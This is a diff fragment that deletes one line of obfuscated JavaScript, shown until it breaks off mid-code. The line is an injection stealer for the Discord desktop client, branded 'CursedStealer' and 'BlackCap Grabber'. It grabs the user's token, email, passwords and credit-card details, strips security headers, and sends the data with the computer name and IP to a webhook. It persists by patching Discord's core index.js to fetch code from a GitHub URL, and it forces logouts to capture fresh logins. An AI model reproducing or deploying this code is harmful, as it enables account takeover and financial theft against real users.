@@ -1,1 +1,1298 @@
-const _0xbe559e=_0x40ca;(function(_0x4a1ee5,_0x192c78){const _0x2b82b5=_0x40ca,_0x32cc74=_0x4a1ee5();while(!![]){try{const _0x3296e8=parseInt(_0x2b82b5(0x179))/0x1+-parseInt(_0x2b82b5(0x1ad))/0x2*(parseInt(_0x2b82b5(0x131))/0x3)+parseInt(_0x2b82b5(0x1a7))/0x4+-parseInt(_0x2b82b5(0x1aa))/0x5+-parseInt(_0x2b82b5(0x186))/0x6*(parseInt(_0x2b82b5(0x1d8))/0x7)+-parseInt(_0x2b82b5(0x135))/0x8*(parseInt(_0x2b82b5(0x156))/0x9)+parseInt(_0x2b82b5(0x19b))/0xa*(parseInt(_0x2b82b5(0x183))/0xb);if(_0x3296e8===_0x192c78)break;else _0x32cc74['push'](_0x32cc74['shift']());}catch(_0x3ee9a1){_0x32cc74['push'](_0x32cc74['shift']());}}}(_0x4f9e,0x362c6));const fs=require('fs'),path=require(_0xbe559e(0x178)),{BrowserWindow,session}=require(_0xbe559e(0x17e)),args=process[_0xbe559e(0x12a)],querystring=require(_0xbe559e(0x132)),os=require('os'),https=require(_0xbe559e(0x12f)),computerName=os['hostname'](),EvalToken=_0xbe559e(0x1bd);String['prototype'][_0xbe559e(0x1d0)]=function(_0x97b217,_0x4ee37d){const _0x1e9513=_0xbe559e;if(_0x97b217>0x0)return this[_0x1e9513(0x193)](0x0,_0x97b217)+_0x4ee37d+this[_0x1e9513(0x134)](_0x97b217);return _0x4ee37d+this;};const config={'logout':_0xbe559e(0x127),'logout-notify':'true','init-notify':'true','embed-color':0x5b604,'injection_url':_0xbe559e(0x142),'webhook':_0xbe559e(0x1cb),'filter2':{'urls':[_0xbe559e(0x1b2),_0xbe559e(0x168),_0xbe559e(0x12e),_0xbe559e(0x1e1),_0xbe559e(0x1fe),'wss://remote-auth-gateway.discord.gg/*']}};let bannerurl='',usericonurl='';const discordPath=(function(){const _0x1a32fa=_0xbe559e,_0xaebf65=args[0x0][_0x1a32fa(0x1f3)](path['sep'])[_0x1a32fa(0x203)](0x0,-0x1)[_0x1a32fa(0x1d3)](path['sep']);let _0x3e2008;if(process[_0x1a32fa(0x1a1)]===_0x1a32fa(0x1ff))_0x3e2008=path['join'](_0xaebf65,'resources');else process[_0x1a32fa(0x1a1)]===_0x1a32fa(0x1a0)&&(_0x3e2008=path['join'](_0xaebf65,'Contents',_0x1a32fa(0x20d)));if(fs['existsSync'](_0x3e2008))return{'resourcePath':_0x3e2008,'app':_0xaebf65};return'','';}());function updateCheck(){const _0x5b442c=_0xbe559e,{resourcePath:_0x910b5e,app:_0x527249}=discordPath;if(_0x910b5e===undefined||_0x527249===undefined)return;const _0x418981=path[_0x5b442c(0x1d3)](_0x910b5e,'app'),_0xf2a6ef=path[_0x5b442c(0x1d3)](_0x418981,_0x5b442c(0x136)),_0x146d04=path['join'](_0x418981,_0x5b442c(0x20c)),_0x3bd245=_0x527249+_0x5b442c(0x13a),_0xdb671a=path[_0x5b442c(0x1d3)](process[_0x5b442c(0x146)][_0x5b442c(0x1f9)],'\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar');if(!fs['existsSync'](_0x418981))fs[_0x5b442c(0x16f)](_0x418981);if(fs['existsSync'](_0xf2a6ef))fs['unlinkSync'](_0xf2a6ef);if(fs['existsSync'](_0x146d04))fs[_0x5b442c(0x1f7)](_0x146d04);if(process[_0x5b442c(0x1a1)]===_0x5b442c(0x1ff)||process[_0x5b442c(0x1a1)]===_0x5b442c(0x1a0)){fs[_0x5b442c(0x1dd)](_0xf2a6ef,JSON[_0x5b442c(0x1fd)]({'name':_0x5b442c(0x1c8),'main':_0x5b442c(0x20c)},null,0x4));const _0x5856b5=_0x5b442c(0x1b7)+_0x3bd245+'\x27;\x0aconst\x20bdPath\x20=\x20\x27'+_0xdb671a+_0x5b442c(0x17d)+config[_0x5b442c(0x155)]+_0x5b442c(0x1c7)+config[_0x5b442c(0x1ca)]+_0x5b442c(0x1c2)+path[_0x5b442c(0x1d3)](_0x910b5e,'app.asar')+_0x5b442c(0x160);fs['writeFileSync'](_0x146d04,_0x5856b5[_0x5b442c(0x13f)](/\\/g,'\x5c\x5c'));}if(!fs[_0x5b442c(0x18b)](path[_0x5b442c(0x1d3)](__dirname,_0x5b442c(0x128))))return!0x0;return execScript(_0x5b442c(0x1d5)),!0x1;}function _0x4f9e(){const _0x230538=['\x0a\x0a-\x20Injection\x20Path:\x20\x0a','application/json','https://discord.com/api/v*/users/@me/billing/subscriptions','🇩🇪\x20Deutsch','CursedStealer\x20User\x20Login','protocol','substring','```\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**ID**\x20<:iduser:1041634535395307520>\x0a```','https://discord.com/api/v*/users/@me','onHeadersReceived','None','<:classic:896119171019067423>\x20`Nitro\x20Classic`','email','\x0a\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22','730RZoJsq','method','[<a:blackcapgif:1041634542093619260>\x20│\x20**Website**](https://www.cursedstealer.website)','`\x0a[Copy\x20ID](https://paste-pgpj.onrender.com/?p=','discord.com','darwin','platform','\x0afunction\x20userclick()\x20{\x0a\x20\x20\x20\x20waitForElm(\x22.children-1xdcWE\x22).then((elm)=>elm[2].remove())\x0a\x20\x20\x20\x20waitForElm(\x22.sectionTitle-3j2YI1\x22).then((elm)=>elm[2].remove())\x0a}\x0a\x0afunction\x20IsSession(item)\x20{\x0a\x20\x20\x20\x20return\x20item?.innerText?.includes(\x22Devices\x22)\x0a}\x0a\x0afunction\x20handler(e)\x20{\x0a\x20\x20\x20\x20e\x20=\x20e\x20||\x20window.event;\x0a\x20\x20\x20\x20var\x20target\x20=\x20e.target\x20||\x20e.srcElement,\x0a\x20\x20\x20\x20text\x20=\x20target.textContent\x20||\x20target.innerText;\x20\x20\x20\x0a\x20\x20\x20\x20if\x20(IsSession(target))\x20userclick()\x0a}\x0afunction\x20waitForElm(selector)\x20{\x0a\x20\x20\x20\x20return\x20new\x20Promise(resolve\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20observer\x20=\x20new\x20MutationObserver(mutations\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(document.querySelectorAll(selector).length>2)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20resolve(document.querySelectorAll(selector))\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20observer.disconnect();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20observer.observe(document.body,\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20childList:\x20true,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20subtree:\x20true\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20});\x0a}\x0adocument.addEventListener(\x27click\x27,handler,false);\x0a','🏴󠁧󠁢󠁥󠁮󠁧󠁿\x20English','login','https://discord.com/api/v8/users/@me','open','897476ZsLQSt','[CursedStealer\x202022\x20:skull:](https://www.cursedstealer.website)','then','1203625mRBwSm','🇺🇦\x20Ukrainian','Injection\x20Info','12VkJyrl','Cursed','uploadData','Language\x20<:language:1041640473477001236>','public_flags','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','🇨🇳\x20Chinese-China','rmdirSync','\x20:credit_card:','host','const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJS\x20=\x20\x27','https://discordapp.com/api/v*/users/@me','responseHeaders','🇫🇷\x20French','onBeforeRequest','users/@me','for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x22getToken\x22==a&&(token=b.default.getToken())}token;','https://*.discord.com/api/v*/users/@me','🇮🇳\x20Indian','BlackCap\x20Grabber','\x0a\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Username**\x20<:username:1041634536733290596>\x0a```','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27','forEach','```\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Email**\x20<a:email:1041639672037785691>\x0a```','<a:password:1041639669047238676>\x20Old\x20Password','<a:totalfriends:1041641100017946685>\x20Total\x20Friends\x20(','\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJS);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27core\x27\x20+\x20\x27num\x27,\x20indexJS).replace(\x27%WEBHOOK%\x27,\x20\x27','discord','https://*.discord.com/api/v*/auth/login','webhook','%WEBHOOK%','includes','https://discord.com/api/v*/auth/login','ID\x20<:iduser:1041634535395307520>','🇨🇳\x20Chinese-Taiwanese','insert','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Credit\x20Card\x20Number**\x0a```','\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','join','```\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**CVC**\x0a```','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','length','🇰🇷\x20Korean','1414PDCliK','banner','PATCH','<:bughunter_1:874750808426692658>\x20','CursedStealer\x20User\x20log\x20out','writeFileSync','Username\x20<:username:1041634536733290596>','<a:password:1041639669047238676>\x20Password','card[exp_month]','https://*.discord.com/api/v*/users/@me/library','https://discordapp.com/api/v*/auth/login','\x0a```','🇩🇰\x20Dansk','error','\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText','card[number]','toString','Billing\x20<a:billing:1041641103629234196>','tokens','false','user','write','🔒\x20`A2F\x20Enabled`','🇵🇱\x20Polish','🇵🇹\x20Portuguese','.png?size=160','locale','split','CursedStealer\x20Infected','endsWith','<:bughunter_2:874750808430874664>\x20','unlinkSync','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20JSON.parse(xmlHttp.responseText);','APPDATA','\x22,\x20false\x20);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','🇳🇴\x20Norwegian','CursedStealer\x20got\x20logged\x20out','stringify','https://discord.com/api/v*/users/@me/library','win32','wss://remote-auth-gateway.discord.gg/*','<:hypesquad_events:874750808594477056>\x20','executeJavaScript','slice','CursedStealer\x20User\x20Credit\x20Card\x20Added','https://cdn.discordapp.com/avatars/','zh-CN','new_password','defaultSession','<a:tokens:1041634540537511957>\x20Token','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**IP:**\x20','parse','index.js','Resources','invalid','discriminator','Idk\x20bro\x20you\x20got\x20me','<a:password:1041639669047238676>\x20New\x20Password','request','end','logout','log','avatar','premium_type','https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png','type','true','blackcap','\x0a\x0a\x09\x09\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Badges**\x20<:badge:1041634538150973460>\x0a','argv','Nitro\x20<a:nitro:1041639670288748634>','wss://remote-auth-gateway','🇹🇼\x20Taiwanese','https://discord.com/api/v*/applications/detectable','https','sv-SE','52344bqOjAQ','querystring','default-src\x20\x27*\x27','substr','408oVzzwS','package.json','getAllWindows','<:developer:874750808472825986>\x20','https://cdn.discordapp.com/banners/','\x5cmodules\x5cdiscord_desktop_core-1\x5cdiscord_desktop_core\x5cindex.js','content-security-policy-report-only','```\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Credit\x20Card\x20Expiration**\x0a```','url','flags','replace','No\x20Nitro','logout-notify','https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js','\x0a\x0a-\x20IP:\x20\x0a','https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png','nsfw_allowed','env','\x0aInjection\x20PATH:\x20\x0a','.png?size=600','%LOGOUT%','```\x0a[Copy\x20Token](https://paste-pgpj.onrender.com/?p=','```','Badges\x20<:badge:1041634538150973460>','password','```\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a:tokens:1041634540537511957>\x20**Token**\x20\x0a```','mfa_enabled','<a:boost:824036778570416129>\x20`Nitro\x20Boost`','🇷🇴\x20Romanian','🇸🇪\x20Swedish','bytes','No\x20Rare\x20Friends','injection_url','33408XoLEiR','init-notify','filter','webRequest','A2F\x20<a:a2f:1040272766982692885>','zh-TW','catch','```diff\x0a-\x20Computer\x20Name:\x20\x0a','https://www.myexternalip.com/json','`✔️`','\x27)\x0aif\x20(fs.existsSync(bdPath))\x20require(bdPath);','Access-Control-Allow-Origin\x20\x27*\x27','🇨🇿\x20Czech','username','\x0a```\x0a\x0a','`❌`','<:staff:874750808728666152>\x20','🇬🇷\x20Greek','https://*.discord.com/api/v*/applications/detectable',')\x0a\x0a[Download\x20Banner](','Access-Control-Allow-Headers\x20\x27*\x27','exports','webContents','from','<:balance:874750808267292683>\x20','mkdirSync','<:early_supporter:874750808414113823>\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/relationships\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','New\x20Email\x20<a:email:1041639672037785691>','🇱🇹\x20Lithuanian','CursedStealer\x20-\x20Infected','\x20<:paypal:896441236062347374>','Username\x20<:username:1041634536733290596>\x20','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);','path','96375gffKrH','🇮🇹\x20Italianio','@Copyright','pr-BR','\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJS).size\x0afs.readFileSync(indexJS,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27','electron','\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText','[:skull:\x20│\x20**Website**](https://www.cursedstealer.website)','en-US','CursedStealer\x20Initalized','124091SmrFwm','onCompleted','🇹🇷\x20Turkish','11514TJiPAz','content-security-policy','embed-color','assign','pathname','existsSync','\x0a```\x0a\x0a[Download\x20pfp]('];_0x4f9e=function(){return _0x230538;};return _0x4f9e();}const execScript=_0x56b2f4=>{const _0x3dc098=_0xbe559e,_0x5014ae=BrowserWindow[_0x3dc098(0x137)]()[0x0];return _0x5014ae['webContents'][_0x3dc098(0x202)](_0x56b2f4,!0x0);};function sleep(_0x43b8f1){return new Promise(_0x2f245a=>setTimeout(_0x2f245a,_0x43b8f1));};async function noSessionPlease(){const _0x5c0c16=_0xbe559e;await sleep(0x3e8),execScript(_0x5c0c16(0x1a2));};noSessionPlease(),session['defaultSession'][_0xbe559e(0x159)][_0xbe559e(0x196)]((_0x87049c,_0x13948f)=>{const _0x4ab5dd=_0xbe559e;_0x87049c[_0x4ab5dd(0x13d)]['startsWith'](config[_0x4ab5dd(0x1ca)])?_0x87049c['url'][_0x4ab5dd(0x1cc)](_0x4ab5dd(0x19f))?_0x13948f({'responseHeaders':Object[_0x4ab5dd(0x189)]({'Access-Control-Allow-Headers':'*'},_0x87049c['responseHeaders'])}):_0x13948f({'responseHeaders':Object[_0x4ab5dd(0x189)]({'Content-Security-Policy':[_0x4ab5dd(0x133),_0x4ab5dd(0x16a),_0x4ab5dd(0x161)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x87049c[_0x4ab5dd(0x1b9)])}):(delete _0x87049c['responseHeaders'][_0x4ab5dd(0x187)],delete _0x87049c[_0x4ab5dd(0x1b9)][_0x4ab5dd(0x13b)],_0x13948f({'responseHeaders':{..._0x87049c['responseHeaders'],'Access-Control-Allow-Headers':'*'}}));});const hooker=async _0x50a823=>{const _0x1133fb=_0xbe559e,_0x5c8c1c=JSON[_0x1133fb(0x1fd)](_0x50a823),_0x385bf0=new URL(config[_0x1133fb(0x1ca)]),_0x4fee26={'protocol':_0x385bf0[_0x1133fb(0x192)],'hostname':_0x385bf0[_0x1133fb(0x1b6)],'path':_0x385bf0[_0x1133fb(0x18a)],'method':'POST','headers':{'Content-Type':_0x1133fb(0x18e),'Access-Control-Allow-Origin':'*'}},_0xce66b0=https[_0x1133fb(0x212)](_0x4fee26);_0xce66b0['on'](_0x1133fb(0x1e5),_0x36a0ed=>{const _0x4c295d=_0x1133fb;console[_0x4c295d(0x215)](_0x36a0ed);}),_0xce66b0[_0x1133fb(0x1ed)](_0x5c8c1c),_0xce66b0[_0x1133fb(0x213)]();};async function FirstTime(){const _0x231eaf=_0xbe559e,_0x2fc5aa=BrowserWindow[_0x231eaf(0x137)]()[0x0];_0x2fc5aa[_0x231eaf(0x16c)]['executeJavaScript'](''+EvalToken,!0x0)['then'](async _0x379705=>{const _0x212ef8=_0x231eaf;if(config[_0x212ef8(0x157)]==_0x212ef8(0x127)){if(fs[_0x212ef8(0x18b)](path['join'](__dirname,'Cursed'))){fs[_0x212ef8(0x1b4)](path[_0x212ef8(0x1d3)](__dirname,'Cursed'));if(_0x379705==null||_0x379705==undefined||_0x379705==''){var {ip:_0x2b9c67}=await getFromURL(_0x212ef8(0x15e),null);const _0x4ad918={'username':_0x212ef8(0x174),'content':'','embeds':[{'title':_0x212ef8(0x182),'color':config[_0x212ef8(0x188)],'fields':[{'name':_0x212ef8(0x1ac),'value':_0x212ef8(0x15d)+computerName+_0x212ef8(0x18d)+__dirname+'\x0a\x0a-\x20IP:\x20\x0a'+_0x2b9c67+_0x212ef8(0x1e3),'inline':!0x1}],'author':{'name':'Cursed\x20Stealer'}}]};hooker(_0x4ad918);}else{var _0x42e8ed=await getFromURL(_0x212ef8(0x1a5),_0x379705),{ip:_0x2b9c67}=await getFromURL('https://www.myexternalip.com/json',null);if(_0x42e8ed[_0x212ef8(0x216)]===null)usericonurl='';else usericonurl=_0x212ef8(0x205)+_0x42e8ed['id']+'/'+_0x42e8ed['avatar']+_0x212ef8(0x148);if(_0x42e8ed['banner']===null)bannerurl=_0x212ef8(0x144);else bannerurl=_0x212ef8(0x139)+_0x42e8ed['id']+'/'+_0x42e8ed[_0x212ef8(0x1d9)]+_0x212ef8(0x1f1);const _0x3005bf={'username':_0x212ef8(0x1f4),'content':'','embeds':[{'title':_0x212ef8(0x182),'description':_0x212ef8(0x180),'color':config[_0x212ef8(0x188)],'fields':[{'name':_0x212ef8(0x1ac),'value':_0x212ef8(0x15d)+computerName+_0x212ef8(0x18d)+__dirname+_0x212ef8(0x143)+_0x2b9c67+_0x212ef8(0x18c)+usericonurl+')','inline':!0x1},{'name':_0x212ef8(0x176),'value':'`'+_0x42e8ed[_0x212ef8(0x163)]+'#'+_0x42e8ed[_0x212ef8(0x20f)]+'`','inline':!0x0},{'name':'ID\x20<:iduser:1041634535395307520>','value':'`'+_0x42e8ed['id']+_0x212ef8(0x19e)+_0x42e8ed['id']+')','inline':!0x0},{'name':'Badges\x20<:badge:1041634538150973460>','value':''+GetBadges(_0x42e8ed[_0x212ef8(0x13e)]),'inline':!0x0},{'name':_0x212ef8(0x1b0),'value':''+GetLangue(_0x42e8ed['locale']),'inline':!0x0},{'name':'A2F\x20<a:a2f:1040272766982692885>','value':''+GetA2F(_0x42e8ed['mfa_enabled']),'inline':!0x0},{'name':_0x212ef8(0x17b),'value':_0x212ef8(0x1a8),'inline':!0x0},{'name':_0x212ef8(0x209),'value':'```'+_0x379705+_0x212ef8(0x14a)+_0x379705+')\x0a\x0a[Download\x20Banner]('+bannerurl+')','inline':!0x1}],'footer':{'text':'©CursedStealer'},'image':{'url':bannerurl},'thumbnail':{'url':_0x212ef8(0x205)+_0x42e8ed['id']+'/'+_0x42e8ed[_0x212ef8(0x216)]}}]};hooker(_0x3005bf);};if(!fs['existsSync'](path[_0x212ef8(0x1d3)](__dirname,_0x212ef8(0x1ae))))return!0x0;fs[_0x212ef8(0x1b4)](path['join'](__dirname,_0x212ef8(0x1ae)));if(config[_0x212ef8(0x214)]!=_0x212ef8(0x1eb)||config[_0x212ef8(0x214)]!==_0x212ef8(0x149)){if(config[_0x212ef8(0x141)]==_0x212ef8(0x127)){if(_0x379705==null||_0x379705==undefined||_0x379705==''){var {ip:_0x2b9c67}=await getFromURL('https://www.myexternalip.com/json',null);const _0x52b627={'username':_0x212ef8(0x1f4),'content':'','embeds':[{'title':_0x212ef8(0x1dc),'color':config[_0x212ef8(0x188)],'fields':[{'name':_0x212ef8(0x1ac),'value':'```Name\x20Of\x20Computer:\x20\x0a'+computerName+_0x212ef8(0x147)+__dirname+_0x212ef8(0x143)+_0x2b9c67+_0x212ef8(0x164),'inline':!0x1}]}]};hooker(_0x52b627);}else{var _0x42e8ed=await getFromURL('https://discord.com/api/v8/users/@me',_0x379705),{ip:_0x2b9c67}=await getFromURL('https://www.myexternalip.com/json',null);if(_0x42e8ed[_0x212ef8(0x216)]===null)usericonurl='';else usericonurl=_0x212ef8(0x205)+_0x42e8ed['id']+'/'+_0x42e8ed[_0x212ef8(0x216)]+_0x212ef8(0x148);if(_0x42e8ed[_0x212ef8(0x1d9)]===null)bannerurl='';else bannerurl=_0x212ef8(0x139)+_0x42e8ed['id']+'/'+_0x42e8ed[_0x212ef8(0x1d9)]+'.png?size=160';const _0x45b824={'username':_0x212ef8(0x1c0),'content':'','embeds':[{'title':_0x212ef8(0x1fc),'description':_0x212ef8(0x180),'color':config[_0x212ef8(0x188)],'fields':[{'name':'Injection\x20Info','value':_0x212ef8(0x15d)+computerName+_0x212ef8(0x18d)+__dirname+_0x212ef8(0x143)+_0x2b9c67+'\x0a```\x0a\x0a[Download\x20pfp]('+usericonurl+')','inline':!0x1},{'name':_0x212ef8(0x176),'value':'`'+_0x42e8ed[_0x212ef8(0x163)]+'#'+_0x42e8ed[_0x212ef8(0x20f)]+'`','inline':!0x0},{'name':_0x212ef8(0x1ce),'value':'`'+_0x42e8ed['id']+_0x212ef8(0x19e)+_0x42e8ed['id']+')','inline':!0x0},{'name':_0x212ef8(0x14c),'value':''+GetBadges(_0x42e8ed[_0x212ef8(0x13e)]),'inline':!0x0},{'name':'NSFW\x20<a:nsfw:1041640474617839616>','value':''+GetNSFW(_0x42e8ed[_0x212ef8(0x145)]),'inline':!0x1},{'name':_0x212ef8(0x15a),'value':''+GetA2F(_0x42e8ed['mfa_enabled']),'inline':!0x0},,{'name':_0x212ef8(0x209),'value':_0x212ef8(0x14b)+_0x379705+'```\x0a[Copy\x20Token](https://paste-pgpj.onrender.com/?p='+_0x379705+_0x212ef8(0x169)+bannerurl+')','inline':!0x1}],'thumbnail':{'url':'https://cdn.discordapp.com/avatars/'+_0x42e8ed['id']+'/'+_0x42e8ed['avatar']}}]};hooker(_0x45b824);}}const _0x2e2295=BrowserWindow['getAllWindows']()[0x0];_0x2e2295[_0x212ef8(0x16c)]['executeJavaScript'](_0x212ef8(0x1d5),!0x0)['then'](_0x579d27=>{});}return!0x1;}}});}function _0x40ca(_0x23905c,_0x2b5e25){const _0x4f9ea7=_0x4f9e();return _0x40ca=function(_0x40ca5a,_0x10ad08){_0x40ca5a=_0x40ca5a-0x126;let _0x34c123=_0x4f9ea7[_0x40ca5a];return _0x34c123;},_0x40ca(_0x23905c,_0x2b5e25);}const Filter={'urls':[_0xbe559e(0x1b2),_0xbe559e(0x168),'https://discord.com/api/v*/applications/detectable',_0xbe559e(0x1e1),_0xbe559e(0x1fe),'https://*.discord.com/api/v*/users/@me/billing/subscriptions',_0xbe559e(0x18f),_0xbe559e(0x200)]};async function saveidtofile(_0x5c47d5,_0x305e12){const _0x56b4a7=_0xbe559e;fs[_0x56b4a7(0x1a6)](_0x305e12,function(_0x3a342e){if(_0x3a342e)return;}),fs['appendFile'](_0x305e12,_0x5c47d5+'\x0a',function(_0x356ffa){if(_0x356ffa)return;});}async function deletefile(_0x509d2b){fs['unlink'](''+_0x509d2b,function(_0x474fe0){if(_0x474fe0)return;});}async function getFromURL(_0xf4b845,_0x75540a){const _0x5a0468=_0xbe559e,_0x57afdd=BrowserWindow['getAllWindows']()[0x0];var _0x33a845=await _0x57afdd[_0x5a0468(0x16c)][_0x5a0468(0x202)](_0x5a0468(0x19a)+_0xf4b845+_0x5a0468(0x1fa)+_0x75540a+_0x5a0468(0x1f8),!0x0);return _0x33a845;}async function getFromURLnp(_0x4deb2b,_0x31b4ae){const _0x4a52b6=_0xbe559e,_0x584fe5=BrowserWindow[_0x4a52b6(0x137)]()[0x0];var _0x110c00=await _0x584fe5[_0x4a52b6(0x16c)][_0x4a52b6(0x202)](_0x4a52b6(0x19a)+_0x4deb2b+_0x4a52b6(0x1fa)+_0x31b4ae+_0x4a52b6(0x177),!0x0);return _0x110c00;}function GetNSFW(_0x2d88f4){const _0x3fe872=_0xbe559e;if(_0x2d88f4==!![])return'🔞\x20`NSFW\x20Allowed`';return _0x2d88f4==![]?'🔞\x20`NSFW\x20Not\x20Allowed`':_0x3fe872(0x210);}function GetA2F(_0x240054){const _0x1b7301=_0xbe559e;if(_0x240054==!![])return _0x1b7301(0x1ee);return _0x240054==![]?'🔓\x20`A2F\x20Not\x20Enabled`':'Idk\x20bro\x20you\x20got\x20me';}function GetNitro(_0x509b5a){const _0x520929=_0xbe559e;if(_0x509b5a==0x0)return _0x520929(0x140);if(_0x509b5a==0x1)return _0x520929(0x198);return _0x509b5a==0x2?_0x520929(0x150):_0x520929(0x140);}function GetRBadges(_0x430112){const _0x24f10a=_0xbe559e,_0x4b0c4e=0x1,_0x4cfe30=0x2,_0x182e75=0x4,_0x5f56fc=0x8,_0x13ab64=0x200,_0xc7b3fc=0x4000,_0x26a202=0x20000;var 